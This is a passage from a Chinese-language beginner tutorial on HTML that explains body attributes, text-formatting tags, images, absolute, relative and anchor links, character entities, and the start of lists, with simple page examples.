<td align="left">alink：规定文档中活动链接（active link）的的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>background URL：规定文档的背景图。<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>bgcolor：规定文档的背景颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>link：规定文档中未访问链接的默认颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>text：规定文档中所有文本的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。<br>vlink：规定文档中已被访问链接的颜色<br>&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。</td>
</tr>
</tbody></table>
<p><strong><code>&lt;body&gt;</code>的常用属性</strong></p>
<p>bgColor：网页背景色。如：<code>&lt;body  bgColor = “red”&gt;</code></p>
<p>background：网页背景图片地址。如：<code>&lt;body  background = “images/01.jpg”&gt;</code></p>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;demook.hhh&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1593.png&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;Nice优秀啊....&lt;/h1&gt;</span><br><span class="line">       &lt;h2&gt;是的呢 ヾ(๑╹◡╹)ﾉ<span class="string">&quot; &lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c8246bcd4f93.png" alt="5.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>3. 文本修饰标签</strong></font></p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>&lt;b&gt;&lt;/b&gt;</code></strong></td>
<td align="left">加粗字体。如：<code>&lt;b&gt;HTML文件&lt;/b&gt;</code> ----&gt; <b>HTML文件</b></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;i&gt;&lt;/i&gt;</code></strong></td>
<td align="left">斜体italic。如：<code>&lt;i&gt;HTML文本&lt;/i&gt;</code>----&gt; <i>HTML文本</i></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;u&gt;&lt;/u&gt;</code></strong></td>
<td align="left">下划线underline。如：<code>&lt;u&gt;HTML文本&lt;/u&gt;</code>----&gt; <u>HTML文本</u></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;s&gt;&lt;/s&gt;</code></strong></td>
<td align="left">删除线strike。如：<code>&lt;s&gt;删除线&lt;/s&gt;</code>----&gt; <s>删除线</s></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong></td>
<td align="left">上标，如：<code>3&lt;sup&gt;x&lt;/sup&gt;</code> ----&gt; 3<sup>x</sup></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong></td>
<td align="left">下标，如：<code>6&lt;sub&gt;5&lt;/sub&gt;</code> ----&gt; 6<sub>5</sub></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;font&gt;&lt;/font&gt;</code></strong></td>
<td align="left">字体标记，如：<code>&lt;font size=&quot;4&quot; color=&quot;red&quot; face=&quot;Comic sans MS&quot;&gt;Demo&lt;/font&gt;</code><font size="4" color="red" face="Comic sans MS">Demo</font></td>
</tr>
<tr>
<td align="left"><strong><code>size</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。文本大小，取值1-7（1小，7大）</td>
</tr>
<tr>
<td align="left"><strong><code>color</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。颜色值</td>
</tr>
<tr>
<td align="left"><strong><code>face</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。字体，楷体、黑体、宋体</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>4. <code>&lt;p&gt;&lt;/p&gt;</code>表示一个段落</strong></font></p>
<p>属性及取值如下：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">align</td>
<td align="left">left<br>right<br>center<br>justify</td>
<td align="left">HTML5不支持。 HTML 4.01已废弃。 <br>不赞成使用。请使用样式取代它。 规定段落中文</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>5. <code>&lt;br&gt;</code> 标签</strong></font></p>
<p><code>&lt;br&gt;</code> 标签插入一个简单的换行符。<code>&lt;br&gt;</code> 标签是一个空标签，意味着它没有结束</p>
<p><strong>提示：</strong>在<font color="#FF7F00"><strong>写地址信息或者写诗词时 <code>&lt;br&gt;</code> 标签非常有用</strong></font>。</p>
<p><strong>注释：</strong> 请<font color="#FF7F00"><strong>使用 <code>&lt;br&gt;</code> 标签来输入空行，而不是分割段落</strong></font>。</p>
<p>在 HTML 中，<code>&lt;br&gt;</code> 标签没有结束标签。</p>
<p>在 XHTML 中，<code>&lt;br&gt;</code> 标签必须被正确地关闭，比如这样：<code>&lt;br /&gt;</code> 。</p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>6. <code>&lt;hr&gt;</code> 标签</strong></font></p>
<p><img data-src="https://i.loli.net/2019/03/08/5c82523cb9d72.png" alt="6.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>7. <code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong></font></p>
<p><strong><code>&lt;pre&gt;</code>预排版标记</strong></p>
<p>功能：将保留所有的空白字符(空格、换行符)，换句话说：就是原封不动输出。<br>可参读：<font color="#00B2EE">《<a href="https://www.jianshu.com/p/6abc36c28e45">html &lt;.code&gt;&amp;&lt;.pre&gt;</a>》</font> </p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>8. <code>&lt;strong&gt;</code>和 <code>&lt;em&gt;</code></strong></font></p>
<ul>
<li><p>有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到<code>&lt;em&gt;</code>或<code>&lt;strong&gt;</code>标签。</p>
</li>
<li><p>但两者在强调的语气上有区别:<code>&lt;em&gt;</code> 表示强调，<code>&lt;strong&gt; </code>表示更强烈的强调。并且在浏览器中<code>&lt;em&gt;</code> 默认用斜体表示，<code>&lt;strong&gt;</code> 用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用<code>&lt;strong&gt;</code>表示强调。</p>
</li>
<li><p><font color="#FF7F00"><strong><code>&lt;em&gt;</code>的内容在浏览中显示为斜体，<code>&lt;strong&gt;</code>显示为加粗</strong></font>。如果不喜欢这种样式，没有关系，以后可以使用css样式去改变它。</p>
</li>
</ul>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>9. <code>&lt;span&gt;&lt;/span&gt;</code>&gt;</strong></font></p>
<ul>
<li><p><code>&lt;span&gt;</code> 标签被用来组合文档中的行内元素。span 没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 <code>&lt;span&gt;</code> 应用样式，那么 <code>&lt;span&gt;</code> 元素中的文本与其他文本不会任何视觉上的差异。</p>
</li>
<li><p><code>&lt;span&gt;</code> 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。</p>
</li>
<li><p>被 <code>&lt;span&gt;</code> 元素包含的文本，您可以使用 CSS 对它定义样式，或者使用 JavaScript 对它进行操作。</p>
</li>
</ul>
<br>

<br>


<h4 id="2-3-常用标签-链接和图像"><a href="#2-3-常用标签-链接和图像" class="headerlink" title="2.3 常用标签-链接和图像"></a><font color="#3CB371" face="Comic sans MS">2.3 常用标签-链接和图像</font></h4><h5 id="一-image图像"><a href="#一-image图像" class="headerlink" title="一. image图像"></a><font color="#00B2EE" face="Microsoft YaHei">一. image图像</font></h5><p><strong>注：</strong>这是一个单边标签</p>
<p><font color="#00B2EE" face="Microsoft YaHei"></font></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;img&gt;</code></strong> 单边标签，它只包含属性，并且没有闭合标签。<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>必须属性</strong> ↓↓<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>src</code>**：地址。src 指 “source”。源属性的值是图像的 URL 地址。语法：<code>&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;</code></li>
<li><input checked="" disabled="" type="checkbox"> **<code>alt</code>**：图像替代文本，在浏览器无法载入图像时，浏览器将显示这个替代性的文本而不是图像。语法：<code>&lt;img src=&quot;../style/images/boat.gif&quot; alt=&quot;Big Boat&quot;&gt;</code></li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong>可选属性</strong> ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：图像高度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>width</code></strong> ：图像宽度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>ismap</code></strong> ：为图像定义为服务器端图像映射</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><strong>注：</strong>可以尝试输入其他属性看看效果，想要让图片居中，只能通过CSS。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;p&gt;Life was like a box of chocolates, you never know what you<span class="string">&#x27;re gonna get.（生命就像一盒巧克力，结果往往出人意料。）---《阿甘正传》 </span></span><br><span class="line"><span class="string"> &lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;img src=&quot;https://s2.ax1x.com/2019/03/04/kOxQJS.jpg&quot; width=&quot;200&quot;&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83893d59c1b.png" alt="11.png"></p>
<br>

<h5 id="二-超级链接"><a href="#二-超级链接" class="headerlink" title="二. 超级链接"></a><font color="#00B2EE" face="Microsoft YaHei">二. 超级链接</font></h5><p>请注意<font color="#FF7F00"><strong>超级链接和锚点链接是不一样滴……</strong></font></p>
<p>网站中随处可见超级链接的身影，打开百度新闻，任意点击一段话，就会打开新闻详情页，这全部都是超级链接</p>
<p><strong>语法格式：<code>&lt;a  属性 = “值”&gt;……&lt;/a&gt;</code></strong><br><strong>注：</strong><code>&lt;a&gt;</code>中不能再套<code>&lt;a&gt;</code>标记</p>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>1. 标签</strong></font> </p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;a&gt;&lt;/a&gt;</code></strong> 超级链接，中间是文本提示，常用属性:<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>href</code>**：目标文件的地址URL（该URL可以是相对地址，也可以是绝对地址）</li>
<li><input checked="" disabled="" type="checkbox"> **<code>target</code>**：目标文件的显示窗口的方法：<ul>
<li><input disabled="" type="checkbox"> **<code>_blank</code>**：在新窗口中打开目标文件。</li>
<li><input disabled="" type="checkbox"> **<code>_self</code>**：在当前窗口中打开目标文件(默认打开)，相当于“替换”当前页面操作。</li>
<li><input disabled="" type="checkbox"> **<code>_parent</code>**：在父级窗口来打开目标文件。常用框架网页中</li>
<li><input disabled="" type="checkbox"> **<code>_top</code>**：在最顶级窗口来打开目标文件。常用框架网页中</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>2. 绝对地址URL</strong></font> </p>
<p><strong>（1）远程的绝对地址</strong>：直接输入远程绝对路径</p>
<ol>
<li>访问远程的文件，总是以<code>&lt;a href=&quot;http://域名/主机名..&quot;&gt;提示文本&lt;/a&gt;</code><br>如：<code>&lt;a href=&quot;https://Treecatee.github.io&quot; target=&quot;_blank&quot;&gt;Treecatee.github.io&lt;/a&gt;</code></li>
</ol>
<br>

<p>**（2）本地的绝对地址(很少使用)**：访问本地绝对的路径文件</p>
<ol>
<li>访问本地的绝对地址，是以<code>&lt;a href=&quot;http://file:///开头的绝对地址。&quot;&gt;file:///开头的绝对地址。&lt;/a&gt;</code><br>如：<code>&lt;a href=&quot;file:///D:/image.html&quot; target=&quot;_blank&quot;&gt;</code></li>
</ol>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;https://treecatee.github.io&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;远程绝对路径访问，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;a href=<span class="string">&quot;file:///D:/image.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;(。・∀・)ノ本地绝对路径访问，不要忘记“/ / /”&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c8399a12d344.png" alt="12.png"></p>
<p><font face="Microsoft YaHei" color="#20B2AA"><strong>3. 相对地址URL</strong>（项目中路径一般是相对路径）</font> </p>
<p>（1）当前文件和目标文件是<strong>同级关系</strong>，链接地址直接写目标文件名。</p>
<p>（2）当前文件与<strong>目标文件所在的文件夹是同级关系</strong>，先找“文件夹名”，然后再找“文件名”。</p>
<p>（3）目标文件位于<strong>上一层目录中</strong>，往上找对应的目录，再找目录中的文件。</p>
<ol>
<li><strong>注意：</strong><ol>
<li>**<code>./</code>**代表当前目录，默认使用</li>
<li>**<code>../</code>**代表上一级目录</li>
<li>**<code>../../</code>**代表上两级目录</li>
</ol>
</li>
</ol>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;./tina.html&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;同级目录下的本地相对路径链接，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;a href=<span class="string">&quot;../test/2.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上级目录下的本地相对路径链接 (。・∀・)ノ&lt;/a&gt; </span><br><span class="line">   &lt;a href=<span class="string">&quot;../../dream/hap.mp3&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上上级目录下的本地相对路径链接 ♪(´▽｀)&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>4. 特殊的链接</strong></font> </p>
<p>(1) 下载链接</p>
<ol>
<li><p>这些文件网页可以直接执行，如：.jpg、.png、.gif、.html、.htm、.txt等。</p>
</li>
<li><p>大部分文件，浏览器是不能直接执行的。如：.doc、.xls、.ppt、.rar、.psd……</p>
</li>
</ol>
<p>(2) 邮箱链接</p>
<p>(3) 普通空链接（#）如：<code>&lt;a href=&quot;#&quot;&gt;这是一个空链接&lt;/a&gt;</code></p>
<br>

<h5 id="三-锚点链接"><a href="#三-锚点链接" class="headerlink" title="三. 锚点链接"></a><font color="#00B2EE" face="Microsoft YaHei">三. 锚点链接</font></h5><p><strong><code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></strong> ：定义锚点，做个记号<br>**<code>&lt;a href=&quot;[文件名]#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>** ：记号，功能是跳到做记号的地方</p>
<p>分为当前页面跳转和跨页面跳转，页内跳转时不用文件名，跨页跳转时用。</p>
<br>

<blockquote>
<ol>
<li>锚点是什么？</li>
<li>为什么要用锚点？</li>
<li>锚点怎么用？</li>
</ol>
</blockquote>
<br>

<ol>
<li><strong>锚点是什么？</strong></li>
</ol>
<p>如我们在做一个很长的网页时，需要在页面内做一个导航，点击导航里的链接不是新开一个窗口或者跳转到其他网址，而是<font color="#FF7F00"><strong>跳转到当前页的某一个位置</strong></font>。那么所要跳转到的那个位置，我们就叫做<font color="#FF7F00"><strong>锚点</strong></font>，它是一种<font color="#FF7F00"><strong>在页面内部定位的方式</strong></font>。</p>
<ol start="2">
<li><strong>为什么要用锚点？</strong></li>
</ol>
<p>在写项目的时候，页面比较长，这时候需要设置锚点进行<font color="#FF7F00"><strong>快速定位</strong></font>到某个段落或某个位置。</p>
<ol start="3">
<li><strong>锚点怎么用？</strong></li>
</ol>
<p>分为当前页面跳转或者跨页面跳转：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>定义锚点</strong>(作个记号)：用于定位的目的地。不管是当前当前页面内还是跨页跳转定义方法都一样；<ul>
<li><input disabled="" type="checkbox"> 定义方法：**<code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code><strong>或</strong><code>&lt;h2 id=&quot;锚点名称&quot;&gt;&lt;/h2&gt;</code>**或…..</li>
<li><input checked="" disabled="" type="checkbox"> 锚点名称命名规则：<ul>
<li><input disabled="" type="checkbox"> 可以包含字母、数字、下划线，但<font color="#FF7F00"><strong>只能以字母开头</strong></font>。</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong>锚点</strong>（触发），也称为记号。<ul>
<li><input disabled="" type="checkbox"> 跳到当前页面定义方法：**<code>&lt;a  href=&quot;#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
<li><input disabled="" type="checkbox"> 跨页面跳转定义方法：**<code>&lt;a  href=&quot;目标页面路径#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>id</code>**或</strong><code>name</code>**：定义锚点链接的名称。<ul>
<li><input disabled="" type="checkbox"> name是老方法，id是在name基础上发明的，后来才有的。</li>
<li><input disabled="" type="checkbox"> 使用name属性设置锚点很方便但<font color="#FF7F00"><strong>只能针对a标签来使用</strong></font>，具有一定的局限性。而对div等其他没有name属性的标签就不能起到作用了。</li>
<li><input disabled="" type="checkbox"> id兼容性很好。</li>
</ul>
</li>
</ul>
<br>

<p>示例（页内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">      &lt;a id=<span class="string">&quot;top&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;!--设置锚点，索引功能--&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">      &lt;a href=<span class="string">&quot;#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">              &lt;!--做记号--&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;a&quot;</span>&gt;我是标题一&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;b&quot;</span>&gt;我是标题二&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;c&quot;</span>&gt;我是标题三&lt;/h2&gt;</span><br><span class="line">  　　</span><br><span class="line">      &lt;a href=<span class="string">&quot;#top&quot;</span>&gt;返回新闻顶部&lt;/a&gt;</span><br><span class="line">　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>

<br>

<p>示例（跨内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">                &lt;!--设置锚点，索引功能,然后在目的页面做好记号--&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://treecatee.github.io#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">       &lt;a href=<span class="string">&quot;https://directoree.top#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://taobao.com#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>


<br>

<br>


<h4 id="2-4-HTML字符实体"><a href="#2-4-HTML字符实体" class="headerlink" title="2.4 HTML字符实体"></a><font color="#3CB371" face="Comic sans MS">2.4 HTML字符实体</font></h4><br>

<p><font face="Microsoft YaHei"><strong>HTML 中的</strong><font color="#FF7F00"><strong>预留字符</strong></font><strong>必须被替换为</strong><font color="#FF7F00"><strong>字符实体</strong></font>。</font></p>
<br>

<p><font face="Microsoft YaHei"><strong>1. HTML 实体</strong></font></p>
<ol>
<li><p>在 HTML 中，某些字符是预留的。</p>
</li>
<li><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p>
</li>
<li><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p>
</li>
<li><p><strong>注：</strong><font color="#FF7F00"><strong>记得加上半角分号<code>;</code>符号啊，不然识别不出来</strong></font></p>
</li>
</ol>
<br>

<blockquote>
<p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code><br><strong>提示：</strong>使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p>
</blockquote>
<br>

<p><font face="Microsoft YaHei"><strong>2. 不间断空格（non-breaking space）</strong></font></p>
<ul>
<li><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。</p>
</li>
<li><p>浏览器总是会截短 HTML 页面中的空格。<font color="#FF7F00"><strong>如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个</strong></font>，因此，要使用10个空格的话就需要写10个<code>&amp;nbsp;</code> 。（如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp;</code> 字符实体）</p>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei"><strong>3. HTML 中有用的字符实体</strong></font></p>
<p><strong>注释：</strong>实体名称对大小写敏感！半角分号不要忘记！<br>如果想要输出<code>&amp;nbsp;</code>而不被转义为空格，可这样：<code>&amp;amp;nbsp;</code>，因为<code>&amp;amp;</code>对应<code>$</code>--&gt;&amp;nbsp;</p>
<table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">实体名称</th>
<th align="left">实体编号</th>
</tr>
</thead>
</table>
<pre><code> |空格    |**`&amp;nbsp;`**     |**`&amp;#160;`**</code></pre>
<p>&lt;    |小于号    |**<code>&amp;lt;</code>**    |**<code>&amp;#60;</code>**<br>&gt;    |大于号    |<strong><code>&amp;gt;</code></strong>    |<strong><code>&amp;#62;</code></strong><br>&amp;    |和号    |<strong><code>&amp;amp;</code></strong>        |<strong><code>&amp;#38;</code></strong><br>“    |引号    |<strong><code>&amp;quot;</code></strong>        |<strong><code>&amp;#34;</code></strong><br>‘    |撇号     |<strong><code>&amp;apos; </code></strong>(IE不支持)    |<strong><code>&amp;#39;</code></strong><br>￠    |分（cent）    |<strong><code>&amp;cent;</code></strong>    |<strong><code>&amp;#162;</code></strong><br>£    |镑（pound）    |<strong><code>&amp;pound;</code></strong>    |<strong><code>&amp;#163;</code></strong><br>¥    |元（yen）    |<strong><code>&amp;yen;</code></strong>    |<strong><code>&amp;#165;</code></strong><br>€    |欧元（euro）    |<strong><code>&amp;euro;</code></strong>    |<strong><code>&amp;#8364;</code></strong><br>§    |小节    |<strong><code>&amp;sect;</code></strong>    |<strong><code>&amp;#167;</code></strong><br>©    |版权（copyright）    |<strong><code>&amp;copy;</code></strong>    |<strong><code>&amp;#169;</code></strong><br>®    |注册商标    |<strong><code>&amp;reg;</code></strong>    |<strong><code>&amp;#174;</code></strong><br>™    |商标    |<strong><code>&amp;trade;</code></strong>    |<strong><code>&amp;#8482;</code></strong><br>×    |乘号    |<strong><code>&amp;times;</code></strong>    |<strong><code>&amp;#215;</code></strong><br>÷    |除号    |<strong><code>&amp;divide;</code></strong>    |<strong><code>&amp;#247;</code></strong></p>
<p>完整的实体符号参考：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/tags/html_ref_entities.html">HTML ISO-8859-1 参考手册</a>]</font> </p>
<br>

<br>

<h3 id="三-HTML-列表"><a href="#三-HTML-列表" class="headerlink" title="三. HTML 列表"></a><font color="#FF6347" face="Comic sans MS">三. HTML 列表</font></h3><p>列表就是像word里面的标题一样，顺着往下数的标题。</p>
<p>HTML 支持<font color="#FF7F00"><strong>无序列表ul</strong></font>(unordered list）、<font color="#FF7F00"><strong>有序列表ol</strong></font>（ordered list）和<font color="#FF7F00"><strong>自定义列表dl</strong></font>（definition list）</p>
<br>

<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ul&gt;&lt;/ul&gt;</code></strong> 无序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 列表项属性，放在&lt;ul type=””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>disc</code></strong> 小黑点</li>
<li><input disabled="" type="checkbox"> <strong><code>circle</code></strong> 空心圆</li>
<li><input disabled="" type="checkbox"> <strong><code>square</code></strong> 实心方块</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;ol&gt;&lt;/ol&gt;</code></strong> 有序列表<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>type</code></strong> 编号类型，放在&lt;ol type=””&gt;里，取值有：<ul>
<li><input disabled="" type="checkbox"> <strong><code>1</code></strong> 整数有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>a</code></strong> 字母小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>A</code></strong> 字母大写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>i</code></strong> 罗马小写有序列表</li>
<li><input disabled="" type="checkbox"> <strong><code>I</code></strong> 罗马大写有序列表</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>start</code></strong> 从第几个开始编号(数字)，放在&lt;dl type=”” start=””&gt;里。</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;dl&gt;&lt;/dl&gt;</code></strong> 自定义列表<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dt&gt;&lt;/dt&gt;</code></strong> 自定义列表项<ul>
<li><input disabled="" type="checkbox"> <strong><code>&lt;dd&gt;&lt;/dd&gt;</code></strong> 自定义列表项的描述</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p>列表展示如下：</p>
